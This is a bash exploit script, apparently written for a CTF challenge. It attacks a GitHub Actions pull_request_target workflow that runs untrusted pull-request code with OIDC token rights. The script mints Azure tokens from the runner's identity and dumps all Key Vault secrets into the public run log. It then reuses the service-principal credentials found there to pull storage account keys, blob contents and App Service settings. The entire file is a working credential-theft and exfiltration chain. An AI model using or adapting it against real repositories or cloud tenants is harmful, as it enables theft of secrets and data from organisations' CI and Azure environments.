#!/usr/bin/env bash
# CTF DF26 "Tebamoto Logistics" — exploit pull_request_target + unsafe PR checkout + id-token:write.
# Usage: fork duyhhh-oss/tebamoto-platform, replace ci/build.sh with this file, open a PR to main,
# read the public Actions run log, grep for DF26{...}
set +e
T=$AZURE_TENANT_ID; C=$AZURE_CLIENT_ID; S=$AZURE_SUBSCRIPTION_ID
KVV=https://kv-tbl-prod-x3euoz.vault.azure.net
M=https://management.azure.com
API_SA=2023-01-01; API_WEB=2022-03-01

OIDC=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)

fed(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" \
  --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$2" | jq -r '.access_token // empty'; }
spn(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" \
  --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
req(){ # req METHOD URL [data]  -> print body
  curl -s -X "$1" -H "Authorization: Bearer $ARM" -H 'Content-Length: 0' "$2"; }

echo "===== CTX run=$GITHUB_RUN_ID tenant=$T client=$C sub=$S ====="

# 1) CI federated identity (tbl-cicd-deployer) -> Key Vault
VT=$(fed "$C" "https://vault.azure.net/.default")
echo "===== VAULT token len=${#VT} ====="
SECS=$(curl -s "$KVV/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value[].id')
for u in $SECS; do
  echo "===== KV SECRET [$(basename "$u")] ====="
  curl -s "$u?api-version=7.4" -H "Authorization: Bearer $VT" | head -c 900; echo
done
echo "===== KV DF26 SCAN ====="
for u in $SECS; do curl -s "$u?api-version=7.4" -H "Authorization: Bearer $VT"; done \
  | grep -aoE 'DF26\{[^}]{0,200}\}'

# 2) every KV secret that is an SP credential -> ARM -> sweep storage + app settings
for u in $SECS; do
  body=$(curl -s "$u?api-version=7.4" -H "Authorization: Bearer $VT")
  aid=$(echo "$body" | jq -r '.appId // empty'); as=$(echo "$body" | jq -r '.clientSecret // empty')
  [ -z "$aid" ] && continue; [ -z "$as" ] && continue
  echo "===== SP $(basename "$u") $aid ====="
  ARM=$(spn "$aid" "$as" "https://management.azure.com/.default")
  [ ${#ARM} -lt 50 ] && { echo "no ARM token"; continue; }

  for said in $(curl -s -H "Authorization: Bearer $ARM" \
      "$M/subscriptions/$S/providers/Microsoft.Storage/storageAccounts?api-version=$API_SA" \
      | jq -r '.value[].id'); do
    sa=$(basename "$said")
    KEY=$(curl -s -X POST -H "Authorization: Bearer $ARM" -H 'Content-Length: 0' \
      "$said/listKeys?api-version=$API_SA" | jq -r '.keys[0].value // empty')
    echo "-- SA $sa key=${KEY:+yes}${KEY:-NO}"
    [ -z "$KEY" ] && continue
    auth(){ local d; d=$(date -u +"%a, %d %b %Y %H:%M:%S GMT"); curl -s "$1" -H 'x-ms-version: 2021-08-06' -H "x-ms-date: $d" -H "Authorization: SharedKey $sa:$KEY"; }
    for cont in $(auth "https://$sa.blob.core.windows.net/?comp=list" | grep -oE '<Container><Name>[^<]+' | sed 's/.*<Name>//'); do
      echo "   CONTAINER $cont"
      for blob in $(auth "https://$sa.blob.core.windows.net/$cont?restype=container&comp=list" | grep -oE '<Blob><Name>[^<]+' | sed 's/.*<Name>//'); do
        echo "      BLOB $blob"
        auth "https://$sa.blob.core.windows.net/$cont/$blob" | head -c 700; echo
      done
    done
  done

  for rg_app in "rg-tbl-platform-prod-sea app-tbl-storefront-prod" "rg-tbl-reporting-prod-eus app-tbl-reporting-prod" "rg-tbl-platform-prod-sea app-tbl-reporting-prod" "rg-tbl-reporting-prod-eus app-tbl-storefront-prod"; do
    set -- $rg_app
    cfg=$(curl -s -X POST -H "Authorization: Bearer $ARM" -H 'Content-Length: 0' \
      "$M/subscriptions/$S/resourceGroups/$1/providers/Microsoft.Web/sites/$2/config/appsettings/list?api-version=$API_WEB")
    echo "===== APPSETTINGS $2 (via $(basename "$u")) ====="
    echo "$cfg" | head -c 1500; echo
    echo "$cfg" | grep -aoE 'DF26\{[^}]{0,200}\}'
  done
done
echo DONE-EXPLOIT
